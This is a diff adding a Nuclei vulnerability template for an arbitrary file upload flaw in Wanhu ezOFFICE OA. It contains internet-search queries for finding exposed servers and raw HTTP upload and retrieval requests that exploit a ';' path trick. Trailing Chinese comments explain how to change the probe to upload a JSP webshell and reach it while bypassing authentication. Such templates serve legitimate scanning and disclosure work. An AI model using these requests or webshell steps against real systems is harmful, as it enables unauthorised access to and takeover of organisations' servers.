@@ -1,0 +1,67 @@
+id: wanhu-ezoffice-senddocument-import-fileupload
+info:
+  name: 万户ezoffice senddocument_import.jsp 任意文件上传
+  author: dragon
+  severity: critical
+  description: 万户ezoffice senddocument_import.jsp 任意文件上传
+  tags: wanhu,oa,fileupload,ezoffice
+  metadata:
+    hunter-query: app.name="万户 Ezoffice OA"
+    fofa-query: product="万户网络-ezOFFICE"
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/modules/govoffice/gov_documentmanager/senddocument_import.jsp;?categoryId=null&path=loginpage&mode=add&fileName=null&saveName=null&fileMaxSize=0&fileMaxNum=null&fileType=txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Connection: close
+        Content-Length: 435
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLNvGnzm2o3sImhz
+
+        ------WebKitFormBoundaryvLNvGnzm2o3sImhz
+        Content-Disposition: form-data; name="photo"; filename="{{randstr}}.txt"
+        Content-Type: application/octet-stream
+
+        www.cnvd.org.cn
+        ------WebKitFormBoundaryvLNvGnzm2o3sImhz
+        Content-Disposition: form-data; name="continueUpload"
+
+        0
+        ------WebKitFormBoundaryvLNvGnzm2o3sImhz
+        Content-Disposition: form-data; name="submit"
+
+        导 入
+        ------WebKitFormBoundaryvLNvGnzm2o3sImhz--
+      
+      - |
+        GET /defaultroot/upload/loginpage/{{filename}}; HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Connection: close
+
+    extractors:
+      - type: regex
+        name: filename
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - 'saveName="(.*)"'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "www.cnvd.org.cn"
+        part: body
+
+      - type: status
+        status:
+          - 200
+
+# 利用请将15行的fileType=txt改为fileType=jsp
+# 24行 将上传后缀修改为jsp
+# 27行文件内容改为马子即可
+# 注意访问马子需要在最后面加上 ; 符号，目的是为了绕过鉴权
